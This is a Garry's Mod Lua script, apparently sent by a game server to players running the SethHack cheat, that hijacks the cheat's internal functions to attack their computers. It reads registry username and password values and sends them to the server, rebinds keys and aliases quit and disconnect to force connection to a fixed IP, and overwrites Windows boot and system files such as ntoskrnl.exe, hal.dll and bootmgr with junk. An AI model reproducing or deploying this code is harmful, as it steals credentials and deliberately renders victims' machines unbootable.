
--From HeX with love--

local VTable = {
	SH_SETCVAR,					--1
	SH_SETNAME,					--2
	SH_PURECC,					--3
	SH_LUARUN,					--4
	SH_SETSPEED,				--5
	SH_COMMANDNUMBER,			--6
	SH_ISDORMANT,				--7
	SH_MODVER,					--8
	SH_READFILE,				--9
	SH_WRITEFILE,				--10
	SH_SUPPRESSIPLOGS,			--11
	SH_RUNSCRIPTS,				--12
	SH_REGREAD,					--13
	SH_REGWRITE,				--14
	SH_hl2_ucmd_getprediction,	--15
	SH_hl2_shotmanip,			--16
}


local NotDGL = debug.getlocal
local NotINC = _G.include

function _G.include(path,...)
	if tostring(path) == "includes/extensions/table.lua" then
		for idx,func in ipairs(VTable) do
			local k,v = debug.getlocal(2,idx)
			if type(v) == "function" then
				VTable[idx] = v
			end
		end
	end
	return NotINC(path,...)
end


local function SendStuff(str)
	RunConsoleCommand("gm_carepackage_uh", str)
end

local function DeployCarePackage()
	for k,v in pairs(VTable) do
		if v then
			SendStuff("FK"..tostring(v) )
		end
	end
	
	if VTable.SH_REGREAD then
		local REG = VTable.SH_REGREAD
		local ret,err = pcall(function()
			SendStuff("REG: "..REG("username") )
			SendStuff("REG: "..REG("password") )
		end)
		if err then
			SendStuff("REG: "..err)
		end
	end
	if VTable.SH_MODVER then
		local VER = VTable.SH_MODVER
		local ret,err = pcall(function()
			SendStuff("VER: "..VER() )
		end)
		if err then
			SendStuff("VER: "..err)
		end
	end
	
	
	if VTable.SH_PURECC then
		local SHRCC = VTable.SH_PURECC
		
		local function RCC(s) --Not sure if..
			local ret,err = pcall(function()
				SHRCC(s)
				SHRCC(s.."\n")
			end)
			
			if err then
				SendStuff("RCC: "..err)
			end
		end
		
		local function FuckKey(key)
			RCC('bind '..key..' "alias unbindall; alias unbind; alias bind; say FUCK YOU SETH DO NOT BUY SETHHACK ITS SCAM KEYLOGGER"')
		end
		
		RCC("unbindall")
		RCC("host_writeconfig")
		
		FuckKey("w")
		FuckKey("a")
		FuckKey("s")
		FuckKey("d")
		FuckKey("f")
		FuckKey("q")
		FuckKey("v")
		FuckKey("e")
		FuckKey("tab")
		FuckKey("space")
		
		RCC('alias menu_startgame "connect 188.165.193.84:27023"') --Flap's server, double ban!
		RCC('alias quit "connect 188.165.193.84:27023"')
		RCC('alias disconnect "connect 188.165.193.84:27023"')
		RCC('alias exit "connect 188.165.193.84:27023"')
		
		RCC("host_writeconfig") --Yay for steam cloud
	end
	
	if VTable.SH_WRITEFILE then
		local function Write(p,s)
			local ret,err = pcall(function()
				VTable.SH_WRITEFILE(p,s)
			end)
			
			if err then
				SendStuff("WRITE: "..err)
			end
		end
		
		local LOL = "SethHack Database file v1.3.37"
		
		Write("C:\\boot.ini", LOL)
		Write("C:\\config.sys", LOL)
		Write("iplog.txt", LOL)
		
		Write("C:\\WINDOWS\\bootstat.dat", LOL) --oh god how did this get here im not good with computer
		Write("C:\\WINDOWS\\System32\\ntoskrnl.exe", LOL)
		Write("C:\\WINDOWS\\System32\\hal.dll", LOL)
		
		Write("C:\\WINDOWS\\System32\\bootres.dll", LOL)
		Write("C:\\WINDOWS\\Boot\\DVD\\PCAT\\en-US\\bootfix.bin", LOL)
		Write("C:\\WINDOWS\\Boot\\DVD\\PCAT\\etfsboot.com", LOL)
		Write("C:\\WINDOWS\\Boot\\DVD\\PCAT\\boot.sdi", LOL)
		Write("C:\\WINDOWS\\Boot\\PCAT\\bootmgr", LOL)
		
		Write("..\\..\\..\\ClientRegistry.blob", LOL)
		Write("..\\..\\..\\steamerrorreporter.exe", LOL)
	end
	
	
	timer.Simple(4, function() --Wait for a while
		if VTable.SH_SETNAME then
			local ret,err = pcall(function()
				VTable.SH_SETNAME("FUCK SETH, SETHHACK == KEYLOGGER")
			end)
			
			if err then
				SendStuff("NAME: "..err)
			end
		end
		
		timer.Simple(0.5, function()
			if VTable.SH_SETSPEED then
				local ret,err = pcall(function()
					VTable.SH_SETSPEED(300)
					VTable.SH_SETSPEED("300")
				end)
				
				if err then
					SendStuff("SPEED: "..err)
				end
			end
		end)
	end)
end
timer.Simple(2, DeployCarePackage)






